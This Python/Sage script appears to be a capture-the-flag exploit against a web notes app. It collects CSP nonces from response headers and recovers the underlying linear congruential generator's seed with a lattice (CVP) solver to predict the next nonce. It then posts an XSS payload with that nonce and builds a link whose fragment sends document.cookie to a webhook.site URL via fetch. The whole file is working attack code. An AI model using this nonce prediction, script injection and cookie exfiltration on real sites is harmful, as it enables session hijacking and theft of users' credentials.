from Crypto.Util.number import *
import re
import requests

#the Lattice solve script is from (https://github.com/rkm0959/Inequality_Solving_with_CVP)
from sage.modules.free_module_integer import IntegerLattice

# Directly taken from rbtree's LLL repository
# From https://oddcoder.com/LOL-34c3/, https://hackmd.io/@hakatashi/B1OM7HFVI
def Babai_CVP(mat, target):
	M = IntegerLattice(mat, lll_reduce=True).reduced_basis
	G = M.gram_schmidt()[0]
	diff = target
	for i in reversed(range(G.nrows())):
		diff -=  M[i] * ((diff * G[i]) / (G[i] * G[i])).round()
	return target - diff

def solve(mat, lb, ub, weight = None):
	num_var  = mat.nrows()
	num_ineq = mat.ncols()

	max_element = 0 
	for i in range(num_var):
		for j in range(num_ineq):
			max_element = max(max_element, abs(mat[i, j]))

	if weight == None:
		weight = num_ineq * max_element

    # sanity checker
	if len(lb) != num_ineq:
		print("Fail: len(lb) != num_ineq")
		return

	if len(ub) != num_ineq:
		print("Fail: len(ub) != num_ineq")
		return

	for i in range(num_ineq):
		if lb[i] > ub[i]:
			print("Fail: lb[i] > ub[i] at index", i)
			return

    	# heuristic for number of solutions
	DET = 0

	if num_var == num_ineq:
		DET = abs(mat.det())
		num_sol = 1
		for i in range(num_ineq):
			num_sol *= (ub[i] - lb[i])
		if DET == 0:
			print("Zero Determinant")
		else:
			num_sol //= DET
			# + 1 added in for the sake of not making it zero...
			print("Expected Number of Solutions : ", num_sol + 1)

	# scaling process begins
	max_diff = max([ub[i] - lb[i] for i in range(num_ineq)])
	applied_weights = []

	for i in range(num_ineq):
		ineq_weight = weight if lb[i] == ub[i] else max_diff // (ub[i] - lb[i])
		applied_weights.append(ineq_weight)
		for j in range(num_var):
			mat[j, i] *= ineq_weight
		lb[i] *= ineq_weight
		ub[i] *= ineq_weight

	# Solve CVP
	target = vector([(lb[i] + ub[i]) // 2 for i in range(num_ineq)])
	result = Babai_CVP(mat, target)

	for i in range(num_ineq):
		if (lb[i] <= result[i] <= ub[i]) == False:
			print("Fail : inequality does not hold after solving")
			break
    
    	# recover x
	fin = None

	if DET != 0:
		mat = mat.transpose()
		fin = mat.solve_right(result)
	
	## recover your result
	return result, applied_weights, fin


BITS = 48*8
KNOWN_BITS = 8*8

a = 33512999749417623590472805508750190083700063232957133886465147715290688313218350272866001118397937483369479135959869
b = 38182801665815358509351762164752706491302718093964593212937534404130947785904732184486617725553411469308936847180409
m = 33828807364750862843652002141728143388944991056503758470531642562008967710932811368794217002908614490423558622239481


#url = "http://172.18.0.4:8080"
url = "http://34.122.31.244:8080"

def collect_nonces(token):
    s = requests.Session()
    nonces = []
    for i in range(12):
        r = s.get(url+"/get_notes", cookies={"token":token})
        nonces.append(int(r.headers['Content-Security-Policy'][18:-16] ,16))
    return nonces

# put your token here
token = ""
nonces = collect_nonces(token)

nonces = [x * (2**(BITS-KNOWN_BITS)) for x in nonces]
n = len(nonces)

def get_nonce(ys):
    M = Matrix(ZZ, n * 2 - 1, n - 1 + n)
    for i in range(n - 1):
        M[i, i] = a
        M[i + 1, i] = -1
        M[i, i + n - 1] = 1
        M[n + i, i] = m
    M[n - 1, -1] = 1

    ub = []

    for y1, y2 in zip(ys, ys[1:]):
        ub.append(y2 - a * y1 - b)

    lb = list(ub)

    lb += [0] * n
    ub += [2**(BITS - KNOWN_BITS)] * n

    result, applied_weights, fin = solve(M, lb, ub)

    seed = vector(fin[:n]) + vector(ys)
    seed = (int((seed[0] - b )* int(pow(a, -1, m)) ) ) % int(m)
    
    return seed

seed = get_nonce(nonces)
print(seed)
for _ in range(n+1):
    seed = (a*seed+b ) % m
next_nonce = hex(seed >> (BITS - KNOWN_BITS))[2:]
print(next_nonce)

webhook = "https://webhook.site/46554519-6363-4f05-ae6a-de311c520160"

payload = f"<script nonce={next_nonce}>eval(`'`+document.baseURI)</script>"

r = requests.post(url+"/post_note", cookies={"token":token},data={"note": payload}, headers={"content-type": "application/x-www-form-urlencoded"}, allow_redirects=False)



exploit_url = url + r.headers['Location'] + f"#';fetch('{webhook}/?cookies='+document.cookie)"
# then send this to the testbot
print(exploit_url)

